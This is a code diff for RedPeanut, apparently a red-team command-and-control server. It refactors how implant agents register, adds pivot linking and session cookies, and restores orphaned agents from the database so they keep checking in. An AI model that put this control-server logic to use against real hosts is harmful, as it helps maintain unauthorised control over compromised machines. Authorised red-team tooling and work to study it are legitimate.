@@ -21,6 +21,7 @@ using System.Text.RegularExpressions;
 using Microsoft.Extensions.Configuration;
 using System.Text;
 using Microsoft.EntityFrameworkCore;
+using System.Linq;
 
 namespace RedPeanut
 {
@@ -259,6 +260,19 @@ namespace RedPeanut
             }
         }
 
+        private IAgentInstance CreateAgentInstance(C2Server server,string agentid, string agentPivotid, string serverkey, 
+            string address, int port, int framework,int profileid, byte[] sessionkey = null, byte[] sessioniv = null)
+        {
+            IAgentInstance agent = new AgentInstanceHttp(server, agentid, serverkey, address, port, framework, profileid, sessionkey, sessioniv);
+            //If agentidreq come from a pivoter set the prop
+            if (!string.IsNullOrEmpty(agentPivotid))
+            {
+                IAgentInstance agentInstance = RedPeanutC2.server.GetAgent(agentPivotid);
+                agent.Pivoter = agentInstance;
+            }
+            return agent;
+        }
+
         private ActionResult StepOne(StreamReader reader)
         {
             AgentIdReqMsg agentidrequest = null;
@@ -280,16 +294,12 @@ namespace RedPeanut
 
             try
             {
-                IAgentInstance agent = new AgentInstanceHttp(RedPeanutC2.server, RandomString(10, RedPeanutC2.server.GetRandomObject()), RedPeanutC2.server.GetServerKey(), agentidrequest.address, agentidrequest.port, agentidrequest.framework,Profileid);
-                //If agentidreq come from a pivoter set the prop
-                if (!string.IsNullOrEmpty(agentidrequest.AgentPivot))
-                {
-                    IAgentInstance agentInstance = RedPeanutC2.server.GetAgent(agentidrequest.AgentPivot);
-                    agent.Pivoter = agentInstance;
-                }
+                IAgentInstance agent = CreateAgentInstance(RedPeanutC2.server, RandomString(10, RedPeanutC2.server.GetRandomObject()), 
+                    agentidrequest.AgentPivot, RedPeanutC2.server.GetServerKey(), agentidrequest.address, agentidrequest.port, agentidrequest.framework,Profileid);                
                 RedPeanutC2.server.RegisterAgentInbound(agent.AgentId, agent);
                 string response = CreateMsgAgentId(agent, RedPeanutC2.server.GetServerKey(), Profileid, agentidrequest.framework);
                 //Set cookie
+                ((AgentInstanceHttp)agent).Cookie = EncryptMessage(RedPeanutC2.server.GetServerKey(), agent.AgentId);
                 SetCookieValue("sessionid", EncryptMessage(RedPeanutC2.server.GetServerKey(), agent.AgentId), 0);
                 Console.WriteLine("\n[*] Agent {0} connected", agent.AgentId);
                 Program.GetMenuStack().Peek().RePrintCLI();
@@ -322,7 +332,14 @@ namespace RedPeanut
                     Console.WriteLine("[*] | {0,-10} | {1,-15} | {2,-10} | {3,-32} | {4,-20} | {5,-40} |", agent.AgentId, agent.SysInfo.Ip, agent.SysInfo.Integrity, agent.SysInfo.User, agent.SysInfo.ProcessName, agent.SysInfo.Os);
                     Console.WriteLine("[*]  {0}", new string('-', 144));
                     Program.GetMenuStack().Peek().RePrintCLI();
-                    RedPeanutC2.server.RemoveAgentInbound(agent.AgentId);
+                    try
+                    {
+                        RedPeanutC2.server.RemoveAgentInbound(agent.AgentId);
+                    }
+                    catch (Exception )
+                    {
+                       
+                    }
                     RedPeanutC2.server.RegisterAgent(agent.AgentId, agent);
                     return Ok(CreateOkMgs(agent));
                 }
@@ -433,11 +450,27 @@ namespace RedPeanut
                         }
                         else
                         {
-                            // Agent does not exeists corrupted session or request not legitimate
-                            Console.WriteLine("[x] Agent does not exeists corrupted session or request not legitimate");
-                            Program.GetMenuStack().Peek().RePrintCLI();
-                            httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
-                            return NotFound();
+                            //Check if agent is orfaned
+                            AgentInstance agentInstance = dbContext.Agents.FirstOrDefault<AgentInstance>(s => s.agentid.Equals(decriptedAgentid));
+                            if (agentInstance != null)
+                            {
+                                // 
+                                agent = CreateAgentInstance(RedPeanutC2.server, agentInstance.agentid,
+                                    agentInstance.agentPivotid, RedPeanutC2.server.GetServerKey(), agentInstance.address, agentInstance.port,
+                                    agentInstance.framework, Profileid, agentInstance.sessionkey, agentInstance.sessioniv);
+
+                                StreamReader reader = new StreamReader(Request.Body, System.Text.Encoding.UTF8);
+
+                                return CheckIn(reader, agent);
+                            }
+                            else
+                            {
+                                // Agent does not exeists corrupted session or request not legitimate
+                                Console.WriteLine("[x] Agent does not exeists corrupted session or request not legitimate");
+                                Program.GetMenuStack().Peek().RePrintCLI();
+                                httpContextAccessor.HttpContext.Response.Headers.Add("Connection", "Close");
+                                return NotFound();
+                            }
                         }
                     }                   
                 }
